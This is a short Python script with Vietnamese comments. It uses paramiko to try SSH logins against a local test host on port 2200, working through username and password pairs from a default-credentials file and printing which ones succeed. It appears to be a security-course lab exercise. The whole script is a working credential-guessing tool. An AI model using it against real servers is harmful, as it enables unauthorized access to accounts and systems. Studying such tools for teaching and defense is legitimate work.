import paramiko
import socket
    
def SSHLogin(host,port,username,password):#hàm SSHLogin nhận vào 4 tham số: địa chỉ IP/host, cổng SSH, tên người dùng và mật khẩu
    try: 
        ssh = paramiko.SSHClient() #Tạo một client SSH mới từ paramiko
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())#tự động chấp nhận khóa host nếu máy chủ chưa có trong danh sách tin cậy
        ssh.connect(host,port=port,username=username,password=password)#Thử kết nối đến máy chủ SSH tại địa chỉ host và port với username và password
        ssh_session = ssh.get_transport().open_session()#Mở một phiên làm việc SSH trên kết nối hiện tại
        if ssh_session.active:
            print("SSH login successful on %s:%s with username %s and password %s" % (host,port,username,password))
        ssh.close()
    except:
            print("SSH login failed %s %s" % (username,password))

host = "127.0.0.1"
sshport = 2200
with open("C:\\Users\\Phi Hung\\Desktop\\LTATTT\\defaults.txt","r") as f:
    for line in f:
        vals = line.split()
        username = vals[0].strip()
        password = vals[1].strip()
        SSHLogin(host,sshport,username,password)

